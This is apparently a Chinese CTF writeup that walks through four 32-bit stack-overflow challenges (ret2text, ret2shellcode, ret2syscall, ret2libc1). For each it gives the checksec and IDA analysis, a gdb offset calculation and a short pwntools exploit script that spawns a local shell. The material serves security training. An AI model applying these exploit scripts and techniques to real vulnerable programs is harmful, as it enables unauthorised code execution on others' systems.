# CTF 赛题 Writeup

git链接

## ret2text

1.checksec检查文件相关信息

![image-20230419190601322](C:\Users\51793\AppData\Roaming\Typora\typora-user-images\image-20230419190601322.png)

包括：i386、32位、小端存储、数据段不可执行等

2.IDA分析

main函数，存在gets语句，有溢出可能性

![image-20230419192050437](C:\Users\51793\AppData\Roaming\Typora\typora-user-images\image-20230419192050437.png)

secure函数，存在system(/bin/sh)，地址为0x0804863A

![image-20230419192430519](C:\Users\51793\AppData\Roaming\Typora\typora-user-images\image-20230419192430519.png)

3.确认溢出范围

目的是找到数组s起始位置与saved eip之间的距离

使用pwngdb进行调试，在main函数call gets处下断点，运行后查看EAX与EBP的值

EAX代表数组s的初始地址，EBP代表saved ebp的地址

差值 0xffffcdc8 - 0xffffcd40 = 0x6c

s 相对于返回地址(saved eip)的偏移为 0x6c+4

![image-20230420155031762](C:\Users\51793\AppData\Roaming\Typora\typora-user-images\image-20230420155031762.png)

4.构造payload

PS：网络上最常见的payload没有decode，在python2.7中可以轻松跑过。但在python3中对字符串相加增加了要求，以至于会报类型不匹配的错误（“must be str, not bytes”），因此需要用decode将bytes转为str

```python
from pwn import *

sh = process('./ret2text')
target = 0x804863a
sh.sendline('A' * (0x6c+4) + p32(target).decode("iso-8859-1"))
sh.interactive()
```

5.实验结果

![image-20230420161210446](C:\Users\51793\AppData\Roaming\Typora\typora-user-images\image-20230420161210446.png)

## ret2shellcode

1.checksec检查文件相关信息

关键点：**没有开启NX**

![image-20230420161741130](C:\Users\51793\AppData\Roaming\Typora\typora-user-images\image-20230420161741130.png)

2.IDA分析

main函数，存在gets，并将数组s复制给buf2

![image-20230420163041507](C:\Users\51793\AppData\Roaming\Typora\typora-user-images\image-20230420163041507.png)

buf2在bss段，经过测试发现具有执行权限

![image-20230420163801975](C:\Users\51793\AppData\Roaming\Typora\typora-user-images\image-20230420163801975.png)

- buf2地址：0x0804A080
- gets命令地址：0x08048593

3.确认溢出范围

和ret2text一样，找s到返回地址的距离

offset = ebp - eax + 4 =  0xffffd058 - 0xffffcfec + 4 = 6c + 4 = 0x70

![image-20230420164252479](C:\Users\51793\AppData\Roaming\Typora\typora-user-images\image-20230420164252479.png)

4.构造payload

```python
from pwn import *

buf2_addr = 0x0804A080
offset = 0x70

payload = asm(shellcraft.sh())
payload = payload.ljust(offset, b'a')
payload += p32(buf2_addr)

sh = process('./ret2shellcode')
sh.sendline(payload)
sh.interactive()
```

5.实验结果

![image-20230420165548176](C:\Users\51793\AppData\Roaming\Typora\typora-user-images\image-20230420165548176.png)

## ret2syscall

1.checksec检查文件相关信息

![image-20230421201108648](C:\Users\51793\AppData\Roaming\Typora\typora-user-images\image-20230421201108648.png)

由于开启了NX保护，所以shellcode的方法用不了

2.IDA分析

![image-20230421201854832](C:\Users\51793\AppData\Roaming\Typora\typora-user-images\image-20230421201854832.png)

- 提示说这次没有system调用也没有shellcode，所以只能另想办法。
- 由于存在gets，所以栈溢出是可行的

3.确认溢出范围

![image-20230421202417518](C:\Users\51793\AppData\Roaming\Typora\typora-user-images\image-20230421202417518.png)

用同样的方法先找变量v4到返回地址的偏移：0xffffd218 - 0xffffd1ac + 4 = 0x70

4.系统调用

需要把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么在执行int 0x80时就可执行对应的系统调用

```bash
execve("/bin/sh",NULL,NULL)
```

其中，该程序是 32 位，所以需要满足以下条件

- 系统调用号，即 eax 为 0xb
- 第一个参数，即 ebx 指向 /bin/sh 的地址
- 第二个参数，即 ecx 为 0
- 第三个参数，即 edx 为 0

接下来就需要想办法将四个寄存器设置为对应值，这里需要使用 gadgets

eax：选择第二个作为gadgets，地址为0x080bb196

![image-20230425163847873](C:\Users\51793\AppData\Roaming\Typora\typora-user-images\image-20230425163847873.png)

ebx、ecx、edx：发现一个gadgets，同时涉及三个寄存器，地址为0x0806eb90

![image-20230425164546961](C:\Users\51793\AppData\Roaming\Typora\typora-user-images\image-20230425164546961.png)

 /bin/sh 字符串对应的地址：0x080be408

![image-20230425165357327](C:\Users\51793\AppData\Roaming\Typora\typora-user-images\image-20230425165357327.png)

int 0x80对应地址：0x08049421

![image-20230425165513034](C:\Users\51793\AppData\Roaming\Typora\typora-user-images\image-20230425165513034.png)

5.构造payload

```python
from pwn import *

sh = process('./ret2syscall')

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x080be408
payload = flat(
    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
sh.sendline(payload)
sh.interactive()
```

6.实验结果

![image-20230425170022925](C:\Users\51793\AppData\Roaming\Typora\typora-user-images\image-20230425170022925.png)

## ret2libc1

1.checksec检查文件相关信息

![image-20230425184251458](C:\Users\51793\AppData\Roaming\Typora\typora-user-images\image-20230425184251458.png)

2.IDA分析

main:gets命令——存在栈溢出问题，并且提示ret2libc方法

![image-20230425184411067](C:\Users\51793\AppData\Roaming\Typora\typora-user-images\image-20230425184411067.png)

3.确认溢出范围

用同样的方法先找变量s到返回地址的偏移：0xffffd208 - 0xffffd19c + 4 =  0x70 = 112

![image-20230425184658393](C:\Users\51793\AppData\Roaming\Typora\typora-user-images\image-20230425184658393.png)

4.查看libc的可行性

字符串/bin/sh的地址为0x08048720

![image-20230425185001793](C:\Users\51793\AppData\Roaming\Typora\typora-user-images\image-20230425185001793.png)

system的plt地址为0x08048460

![image-20230425190136036](C:\Users\51793\AppData\Roaming\Typora\typora-user-images\image-20230425190136036.png)

5.构造payload

```python
from pwn import *

sh = process('./ret2libc1')

binsh_addr = 0x8048720
system_plt = 0x08048460
payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr])
sh.sendline(payload)

sh.interactive()
```

6.实验结果

![image-20230425190623553](C:\Users\51793\AppData\Roaming\Typora\typora-user-images\image-20230425190623553.png)